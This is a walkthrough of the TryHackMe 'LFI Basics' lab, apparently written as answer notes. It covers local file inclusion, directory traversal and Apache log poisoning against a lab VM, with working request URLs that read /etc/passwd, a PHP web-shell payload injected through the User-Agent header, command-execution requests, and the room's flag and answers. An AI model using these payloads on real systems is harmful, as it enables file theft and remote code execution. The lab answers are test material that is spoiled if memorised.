# LFI Basics

Learn the basics of local file inclusion

[LFI Basics](https://tryhackme.com/room/lfibasics)

## Topic's

* Local File Inclusion
* Directory Traversal
* Log Poisoning

## Local File Inclusion

**What is LFI?**

[LFI (local file inclusion)](https://dzone.com/articles/what-is-local-file-inclusion-lfi) is a vulnerability which an attacker can exploit to include/read files.

**Why this happens?**

LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.

**Possible impact**

You might consider this is not a serious threat, but exploit LFI can lead to:

* [-] Denial of service
* [-] Remote code execution
* [-] Sensitive information disclosure

1. Let's get to the basics! Start the VM and access it using your browser. **Note: It might take a few minutes to boot**

`No answer needed`

2. Access the first walkthrough, and add a parameter at the end of the link named "?page=".

`No answer needed`

3. Let's include the home page. At the "?page=" parameter enter home.html to include the home page.

`No answer needed`

4. What's the message you get when you include the home.html?

`http://10.10.141.166/lfi/lfi.php?page=home.html`

![](2020-09-28_19-17.png)

`You included home.html`

5. You can also read other system files. For example, you can read the passwd file. Type /etc/passwd in the parameter to read it. It should be similar to this:

![](https://i.imgur.com/DPIHVJp.png)

`No answer needed`

6. What user that it's not by default there is present?

`http://10.10.141.166/lfi/lfi.php?page=/etc/passwd`

`view-source:http://10.10.141.166/lfi/lfi.php?page=/etc/passwd`

```
File included: /etc/passwd<br><br><br>Local file to be used: /etc/passwd<br><br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash
```

`lfi`

7. Well done! You've exploited your first local file inclusion! Here is a piece of vulnerable code if you're interested in how it looks:

![](https://i.imgur.com/15xgoDC.png)

`No answer needed`

## Local File Inclusion using Directory Traversal

Let's exploit a LFI vulnerability leveraging Directory Traversal.

**What is Directory Traversal?**

[Directory traversal or Path Traversal](https://www.owasp.org/index.php/Path_Traversal) is an HTTP attack which allows attackers to access restricted directories and execute commands outside of the web server’s root directory or other paths.

1. Now that we know what Directory Traversal is, let's access the second walkthrough.

`No answer needed`

2. Add the "?page=" parameter, and try to include the home page again. Does it work (Yes/No)?

`http://10.10.141.166/lfi2/lfi.php?page=home.html`

`no`

3. Suppose you have another page named "creditcard", but it's which is in another directory. Let's try finding it. Navigate one directory up, and try to include the file. Use "../" to move one directory up.

`No answer needed`

4. What are the credit card numbers?

`http://10.10.141.166/lfi2/lfi.php?page=../creditcard`

`1111-2222-3333-4444`

5. The same way you can include the passwd file. You'll have to move more directories up. Try reading the passwd file.

`No answer needed`

6. Well done! You've exploited your first LFI using Directory Traversal. Here is a vulnerable piece of code if you're interested in how it looks like:

![](https://i.imgur.com/PxkI9GH.png)

`No answer needed`

## Reaching RCE using LFI and log poisoning

**What is log poisoning?**

[Log Poisoning](https://www.owasp.org/index.php/Log_Injection) is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log.

This is how the apache log file looks like to have the ability to use log poisoning:

![](https://i.imgur.com/ZPoSMdr.png)

1. We got our hands a bit dirty with basic LFI and LFI using path traversal. Let's dig a little deeper, and use log poisoning to get access to the underlying operating system.

`No answer needed`

2. We will inject some malicious php code into the server's log. *Note: In order for that to happen, the directory should have read and execute permissions.*

`No answer needed`

3. Access the third walkthrough, add the "?page=" parameter and let's try reading the apache log file. The log file is located at the following path: /var/log/apache2/access.log

`No answer needed`

4. Can you read the log (Yes/No)?

`http://10.10.141.166/lfi/lfi.php?page=/var/log/apache2/access.log`

```
File included: /var/log/apache2/access.log<br><br><br>Local file to be used: /var/log/apache2/access.log<br><br>10.8.106.222 - - [28/Sep/2020:10:21:03 -0700] "GET /lfi2/lfi.php HTTP/1.1" 200 269 "http://10.10.141.166/?page=home.html" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:21:13 -0700] "GET /lfi2/lfi.php?page=home.html HTTP/1.1" 200 335 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:22:09 -0700] "GET /lfi2/lfi.php?page=creditcard HTTP/1.1" 200 329 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:23:09 -0700] "GET /lfi2/lfi.php?page=creditcard HTTP/1.1" 200 329 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:23:15 -0700] "GET /lfi2/lfi.php?page=../creditcard HTTP/1.1" 200 346 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:24:40 -0700] "GET /lfi2/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 346 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.106.222 - - [28/Sep/2020:10:24:49 -0700] "GET /lfi/lfi.php HTTP/1.1" 200 264 "http://10.10.141.166/?page=home.html" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

`Yes`

5. Since you can do it, let's "poison" it! Fire up Burpsuite and intercept the request (Burp usage is not mandatory, I just like using Burp a lot. You can use ZAP, or other tools you like). Let's insert the following malicious code in the user agent field (The PHP command will allow us to execute system commands by parsing the input to a GET parameter called lfi):

![](https://i.imgur.com/v60QYcZ.png)

Forward the request and add your parameter to the link (in my case lfi). The link becomes: `http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=` Now you can execute commands on the system! Note: In case you don't like the how the output looks as you execute commands, you can press CTRL+U (view source). It will look better.

```php
<?php system($_GET['lfi']) ?>
```

```
GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi= HTTP/1.1
Host: 10.10.141.166
User-Agent: Mozilla/5.0 <?php system($_GET['lfi']) ?> Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

`No answer needed`

6. Give it a try and run uname -r. What's the output of the command?

```
GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r HTTP/1.1
Host: 10.10.141.166
User-Agent: <?php system($_GET['lfi']) ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

`4.15.0-72-generic`

7. With this knowledge read the flag from the lfi user home directory.

```
GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt HTTP/1.1
Host: 10.10.141.166
User-Agent: Mozilla/5.0 <?php system($_GET['lfi']) ?> Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

`10.8.106.222 - - [28/Sep/2020:11:02:22 -0700] "GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt HTTP/1.1" 200 1286 "-" "Mozilla/5.0 THM{a352a5c2acfd22251c3a94105b718fea}
 Firefox/68.0"`

`THM{a352a5c2acfd22251c3a94105b718fea}`

8. There is way more in LFI exploitation. Here we barely scratched the surface. But I encourage you to do more research. Below is what I consider to be the best resource which covers everything related to LFI from basic to advanced: [A huge collection of information regarding LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

`No answer needed`
